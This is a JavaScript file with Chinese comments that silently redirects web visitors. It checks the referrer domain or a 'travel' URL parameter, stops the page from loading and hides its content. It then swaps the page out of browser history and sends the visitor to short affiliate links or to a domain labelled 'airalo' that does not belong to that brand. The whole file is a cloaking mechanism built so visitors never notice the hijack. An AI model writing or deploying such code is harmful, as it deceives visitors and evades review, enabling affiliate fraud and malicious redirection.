// ==================== 配置区域 ====================
// 跳转目标配置 - 方便修改
const TARGET_URLS = {
    kiwi: "https://kiwi.tpk.mx/c3p3hsnR",
    airalo: "https://discoverdestinations.it.com/", 
    tiqets: "https://tiqets.tpk.mx/tVeWxjnH"
};

// 跳转配置
const REDIRECT_CONFIG = {
    kiwi: {
        url: TARGET_URLS.kiwi
    },
    airalo: {
        url: TARGET_URLS.airalo
    },
    tiqets: {
        url: TARGET_URLS.tiqets
    }
};

// 授权域名列表
const AUTHORIZED_DOMAINS = [
    'globetrotgoals.com',
    'sites.google.com',
    '2025thingstodo.online',
    'localhost',
    '127.0.0.1'
];

// ==================== 核心跳转逻辑 ====================

// 立即执行跳转检测 - 页面加载前执行
(function() {
    'use strict';
    
    // 阻止默认页面渲染，实现真正的无感跳转
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function(e) {
            checkImmediateRedirect();
        });
    }
    
    // 立即检查跳转
    checkImmediateRedirect();
})();

/**
 * 立即检查跳转条件 - 静默版本
 */
function checkImmediateRedirect() {
    // 快速获取URL参数
    const urlParams = getUrlParams();
    const referrer = document.referrer;
    
    // 检查触发条件
    const hasAuthorizedDomain = isAuthorizedSource(referrer);
    const paramTriggerResult = checkParameterTrigger(urlParams);
    
    let shouldRedirect = false;
    let targetService = null;
    
    if (paramTriggerResult.triggered) {
        // 优先条件：参数包含travel=服务名
        shouldRedirect = true;
        targetService = paramTriggerResult.service;
    } else if (hasAuthorizedDomain) {
        // 条件2：指定域名来源 - 随机选择服务
        shouldRedirect = true;
        const services = Object.keys(REDIRECT_CONFIG);
        const randomIndex = Math.floor(Math.random() * services.length);
        targetService = services[randomIndex];
    }
    
    if (!shouldRedirect) {
        return;
    }

    // 立即执行无感跳转
    executeSeamlessRedirect(targetService);
}

/**
 * 检查参数触发条件
 */
function checkParameterTrigger(urlParams) {
    const travelParam = urlParams.travel;
    
    if (!travelParam) {
        return { triggered: false, service: null };
    }
    
    // 检查是否为有效的服务名
    const hasService = REDIRECT_CONFIG.hasOwnProperty(travelParam);
    
    if (hasService) {
        return { triggered: true, service: travelParam };
    }
    
    return { triggered: false, service: null };
}

/**
 * 快速获取URL参数
 */
function getUrlParams() {
    const params = {};
    const queryString = window.location.search.substring(1);
    
    if (!queryString) {
        return params;
    }
    
    const pairs = queryString.split('&');
    
    for (let i = 0; i < pairs.length; i++) {
        const pair = pairs[i].split('=');
        
        if (pair[0]) {
            const key = decodeURIComponent(pair[0]);
            const value = decodeURIComponent(pair[1] || '').toLowerCase().trim();
            params[key] = value;
        }
    }
    
    return params;
}

/**
 * 域名验证 - 检查是否为指定域名
 */
function isAuthorizedSource(referrer) {
    if (!referrer) {
        return false;
    }
    
    try {
        const domain = referrer.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '');
        
        return AUTHORIZED_DOMAINS.some(authorizedDomain => {
            const cleanAuthorized = authorizedDomain.replace(/^www\./, '');
            return domain === cleanAuthorized || domain.endsWith('.' + cleanAuthorized);
        });
    } catch (error) {
        return false;
    }
}

/**
 * 执行无感跳转 - 只在当前标签页
 */
function executeSeamlessRedirect(service) {
    const config = REDIRECT_CONFIG[service];
    
    if (!config || !config.url) {
        return;
    }

    // 记录跳转信息（静默）
    recordRedirectInfo(service, config.url);
    
    // 执行无感跳转 - 确保只在当前标签页
    performSeamlessRedirect(config.url);
}

/**
 * 执行无感跳转 - 优化版本，确保当前标签页跳转
 */
function performSeamlessRedirect(url) {
    // 验证URL格式
    if (!url || typeof url !== 'string' || !url.match(/^https?:\/\/.+/)) {
        return;
    }
    
    url = url.trim();
    
    // 停止当前页面加载
    try {
        window.stop && window.stop();
    } catch (e) {}
    
    // 清空页面内容，防止闪烁
    try {
        if (document.body) {
            document.body.innerHTML = '';
            document.body.style.display = 'none';
        }
    } catch (e) {}
    
    // 使用最直接的跳转方式 - 确保在当前标签页
    try {
        // 方法1: 使用 location.replace (不会留下历史记录，更无感)
        window.location.replace(url);
        return;
    } catch (error) {
        // 方法2: 备用方案
        try {
            window.location.href = url;
            return;
        } catch (error2) {
            // 方法3: 最后的备用方案
            try {
                window.location.assign(url);
            } catch (error3) {
                // 如果所有方法都失败，使用DOM方式（确保当前标签页）
                fallbackCurrentTabRedirect(url);
            }
        }
    }
}

/**
 * 备用跳转方案 - 确保当前标签页
 */
function fallbackCurrentTabRedirect(url) {
    try {
        // 创建表单提交方式跳转（确保当前标签页）
        const form = document.createElement('form');
        form.method = 'get';
        form.action = url;
        form.style.display = 'none';
        
        // 确保在当前标签页打开
        form.target = '_self';
        
        document.body.appendChild(form);
        form.submit();
        
        // 清理
        setTimeout(() => {
            if (form.parentNode) {
                form.parentNode.removeChild(form);
            }
        }, 100);
    } catch (error) {
        // 最后的方案：使用 window.open 替换当前页面
        try {
            window.open(url, '_self');
        } catch (finalError) {
            // 完全失败的情况下，直接修改location
            window.location = url;
        }
    }
}

/**
 * 记录跳转信息 - 静默版本
 */
function recordRedirectInfo(service, targetUrl) {
    try {
        const redirectData = {
            service: service,
            targetUrl: targetUrl,
            source: window.location.hostname,
            referrer: document.referrer,
            timestamp: Date.now()
        };
        
        // 可选：发送到分析服务器（如果需要）
        // sendToAnalytics(redirectData);
    } catch (error) {
        // 静默处理错误
    }
}

/**
 * 发送统计数据到分析服务器（可选）
 */
function sendToAnalytics(data) {
    if (navigator.sendBeacon) {
        try {
            const formData = new FormData();
            formData.append('data', JSON.stringify(data));
            navigator.sendBeacon('/analytics', formData);
        } catch (error) {
            // 静默处理错误
        }
    }
}

// ==================== 备用检查机制 ====================

// 确保在任何情况下都能触发跳转检查
setTimeout(checkImmediateRedirect, 0);

// 页面可见性改变时的检查
if (typeof document.addEventListener !== 'undefined') {
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
            checkImmediateRedirect();
        }
    });
}

// ==================== 手动跳转处理 ====================

/**
 * 手动触发跳转（按钮点击等）- 确保当前标签页
 */
function handleManualRedirect() {
    const urlParams = getUrlParams();
    
    // 检查参数触发条件
    const paramTriggerResult = checkParameterTrigger(urlParams);
    if (paramTriggerResult.triggered) {
        executeSeamlessRedirect(paramTriggerResult.service);
        return;
    }

    // 检查域名授权
    if (!isAuthorizedSource(document.referrer)) {
        return;
    }

    // 随机选择服务
    const services = Object.keys(REDIRECT_CONFIG);
    const randomIndex = Math.floor(Math.random() * services.length);
    const service = services[randomIndex];

    executeSeamlessRedirect(service);
}

// 兼容旧版本函数名
function handleDealsClick() {
    handleManualRedirect();
}

function checkAuthorizedRedirect() {
    checkImmediateRedirect();
}

// ==================== 页面优化 ====================

// 预防页面内容显示，实现真正无感跳转
(function() {
    'use strict';
    
    // 尽早隐藏页面内容
    const style = document.createElement('style');
    style.textContent = `
        html, body {
            visibility: hidden !important;
            opacity: 0 !important;
        }
    `;
    
    // 尽可能早地添加样式
    if (document.head) {
        document.head.appendChild(style);
    } else if (document.documentElement) {
        document.documentElement.appendChild(style);
    }
    
    // 短暂延迟后恢复显示（如果没有跳转）
    setTimeout(function() {
        if (style.parentNode) {
            style.parentNode.removeChild(style);
        }
    }, 1000);
})();
